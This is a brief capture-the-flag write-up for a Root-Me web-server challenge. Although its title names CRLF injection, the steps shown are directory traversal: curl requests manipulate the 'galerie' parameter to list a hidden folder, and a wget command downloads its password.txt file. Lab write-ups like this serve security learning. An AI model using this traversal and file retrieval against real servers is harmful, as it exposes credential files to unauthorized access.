# 🧩Challenge : CRLF%0d%0aInjection

# 🔍 Description
- The main goal of this challenge is to navigate and manipulate the URL.

# ⚙️ Exploitation
- By analyzing the source code, we can see that the application loads directories based on the ``galerie`` parameter in the URL.
This means we can manipulate this parameter to explore other directories on the server, which is the core of the vulnerability.

``curl http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=actions``

- When we go back to the root directory, we find a new folder that contains a ``password.txt`` file

``curl http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=/86hwnX2r``

- We can then retrieve the file using wget
```
wget http://challenge01.root-me.org/web-serveur/ch15/galerie///86hwnX2r/password.txt
```

